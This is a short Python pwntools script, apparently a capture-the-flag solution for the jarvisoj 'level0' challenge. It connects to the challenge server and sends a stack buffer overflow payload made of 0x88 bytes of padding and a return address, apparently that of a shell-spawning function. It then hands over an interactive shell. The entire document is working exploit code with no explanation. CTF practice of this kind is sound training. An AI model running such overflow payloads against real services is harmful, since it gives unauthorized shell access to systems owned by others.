#coding=utf-8

from pwn import *

r=remote("pwn2.jarvisoj.com",9881)

#r=process("./level0")

r.recvuntil("Hello,World\n")

sh=0x400596

payload=(0x80+0x8)*"a"+p64(sh)

r.sendline(payload)

#r.sendafter("Hello,World\n",payload)

r.interactive()
